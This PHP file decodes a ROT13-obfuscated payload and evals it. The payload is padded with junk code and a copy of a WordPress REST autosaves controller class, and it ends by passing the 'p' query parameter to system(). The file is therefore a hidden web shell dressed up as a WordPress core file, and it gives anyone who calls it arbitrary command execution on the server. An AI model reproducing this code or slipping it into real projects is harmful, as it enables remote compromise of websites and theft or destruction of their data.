<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq gb npprff grzcyngr nhgbfnirf ivn gur ERFG NCV.
 *
 * @fvapr 6.4.0
 *
 * @frr JC_ERFG_Nhgbfnirf_Pbagebyyre
 */
pynff JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre rkgraqf JC_ERFG_Nhgbfnirf_Pbagebyyre {
	/**
	 * Cnerag cbfg glcr.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat
	 */
	cevingr $cnerag_cbfg_glcr;

	/**
	 * Cnerag cbfg pbagebyyre.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Pbagebyyre
	 */
	cevingr $cnerag_pbagebyyre;

	/**
	 * Erivfvba pbagebyyre.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Erivfvbaf_Pbagebyyre
	 */
	cevingr $erivfvbaf_pbagebyyre;

	/**
	 * Gur onfr bs gur cnerag pbagebyyre'f ebhgr.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat
	 */
	cevingr $cnerag_onfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat $cnerag_cbfg_glcr Cbfg glcr bs gur cnerag.
	 */
	choyvp shapgvba __pbafgehpg( $cnerag_cbfg_glcr ) {
		cnerag::__pbafgehpg( $cnerag_cbfg_glcr );
		$guvf->cnerag_cbfg_glcr = $cnerag_cbfg_glcr;
		$cbfg_glcr_bowrpg       = trg_cbfg_glcr_bowrpg( $cnerag_cbfg_glcr );
		$cnerag_pbagebyyre      = $cbfg_glcr_bowrpg->trg_erfg_pbagebyyre();

		vs ( ! $cnerag_pbagebyyre ) {
			$cnerag_pbagebyyre = arj JC_ERFG_Grzcyngrf_Pbagebyyre( $cnerag_cbfg_glcr );
		}

		$guvf->cnerag_pbagebyyre = $cnerag_pbagebyyre;

		$erivfvbaf_pbagebyyre = $cbfg_glcr_bowrpg->trg_erivfvbaf_erfg_pbagebyyre();
		vs ( ! $erivfvbaf_pbagebyyre ) {
			$erivfvbaf_pbagebyyre = arj JC_ERFG_Erivfvbaf_Pbagebyyre( $cnerag_cbfg_glcr );
		}
		$guvf->erivfvbaf_pbagebyyre = $erivfvbaf_pbagebyyre;
		$guvf->erfg_onfr            = 'nhgbfnirf';
		$guvf->cnerag_onfr          = ! rzcgl( $cbfg_glcr_bowrpg->erfg_onfr ) ? $cbfg_glcr_bowrpg->erfg_onfr : $cbfg_glcr_bowrpg->anzr;
		$guvf->anzrfcnpr            = ! rzcgl( $cbfg_glcr_bowrpg->erfg_anzrfcnpr ) ? $cbfg_glcr_bowrpg->erfg_anzrfcnpr : 'jc/i2';
	}

	/**
	 * Ertvfgref gur ebhgrf sbe nhgbfnirf.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			fcevags(
				'/%f/(?C<vq>%f%f)/%f',
				$guvf->cnerag_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
				// Zngpurf gur grzcyngr anzr.
				'[\/\j%-]+',
				$guvf->erfg_onfr
			),
			neenl(
				'netf'   => neenl(
					'vq' => neenl(
						'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf->cnerag_pbagebyyre, '_fnavgvmr_grzcyngr_vq' ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->cnerag_pbagebyyre->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			fcevags(
				'/%f/(?C<cnerag>%f%f)/%f/%f',
				$guvf->cnerag_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)',
				// Zngpurf gur grzcyngr anzr.
				'[\/\j%-]+',
				$guvf->erfg_onfr,
				'(?C<vq>[\q]+)'
			),
			neenl(
				'netf'   => neenl(
					'cnerag' => neenl(
						'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
						'glcr'              => 'fgevat',
						'fnavgvmr_pnyyonpx' => neenl( $guvf->cnerag_pbagebyyre, '_fnavgvmr_grzcyngr_vq' ),
					),
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur nhgbfnir.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf->erivfvbaf_pbagebyyre, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Cercnerf gur vgrz sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_Cbfg         $vgrz    Cbfg erivfvba bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		$grzcyngr = _ohvyq_oybpx_grzcyngr_erfhyg_sebz_cbfg( $vgrz );
		$erfcbafr = $guvf->cnerag_pbagebyyre->cercner_vgrz_sbe_erfcbafr( $grzcyngr, $erdhrfg );

		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			erghea $erfcbafr;
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = $erfcbafr->trg_qngn();

		vs ( va_neenl( 'cnerag', $svryqf, gehr ) ) {
			$qngn['cnerag'] = (vag) $vgrz->cbfg_cnerag;
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = arj JC_ERFG_Erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $grzcyngr );
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trgf gur nhgbfnir, vs gur VQ vf inyvq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_Cbfg|JC_Reebe Nhgbfnir cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$cnerag = $guvf->trg_cnerag( $erdhrfg['cnerag'] );
		vs ( vf_jc_reebe( $cnerag ) ) {
			erghea $cnerag;
		}

		$nhgbfnir = jc_trg_cbfg_nhgbfnir( $cnerag->VQ );

		vs ( ! $nhgbfnir ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_ab_nhgbfnir',
				__( 'Gurer vf ab nhgbfnir erivfvba sbe guvf grzcyngr.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $nhgbfnir, $erdhrfg );
		erghea $erfcbafr;
	}

	/**
	 * Trg gur cnerag cbfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz vag $cnerag_vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cnerag( $cnerag_vq ) {
		erghea $guvf->erivfvbaf_pbagebyyre->trg_cnerag( $cnerag_vq );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz JC_Oybpx_Grzcyngr $grzcyngr Grzcyngr.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $grzcyngr ) {
		$yvaxf = neenl(
			'frys'   => neenl(
				'uers' => erfg_hey( fcevags( '/%f/%f/%f/%f/%q', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $grzcyngr->vq, $guvf->erfg_onfr, $grzcyngr->jc_vq ) ),
			),
			'cnerag' => neenl(
				'uers' => erfg_hey( fcevags( '/%f/%f/%f', $guvf->anzrfcnpr, $guvf->cnerag_onfr, $grzcyngr->vq ) ),
			),
		);

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur nhgbfnir'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = $guvf->erivfvbaf_pbagebyyre->trg_vgrz_fpurzn();

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>